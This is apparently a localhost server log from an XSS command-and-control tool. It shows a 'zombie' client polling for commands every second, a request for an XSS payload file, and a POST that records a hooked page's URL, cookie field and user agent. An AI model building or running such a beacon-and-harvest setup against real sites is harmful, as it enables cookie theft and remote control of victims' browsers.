2025-06-25 00:13:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:12 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:13:13 | INFO     | control_route.py:135 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:13:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:13:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:13] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:13:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:13:13 | INFO     | control_route.py:28 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:13:13 | INFO     | control_route.py:51 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: {"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:13:13.633Z"},時間: 2025-06-25 00:13:13.644909
2025-06-25 00:13:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0090s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:13:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:13] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:13:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:14 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:15 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:16 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:17 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:18 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:19 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:20 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:21 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:22 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0021s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:23 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:24 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:25 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:26 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:27 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:28 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:29 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:30 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0019s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:31 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:32 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:33 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:34 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:35 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:36 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0022s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:37 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:38 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:39 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:40 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:41 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:42 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:43 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:44 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:45 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:46 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:47 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:48 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:49 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:50 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:51 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0018s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:52 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:53 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:54 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:55 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:56 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:57 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:58 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:59 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:00 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:01 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
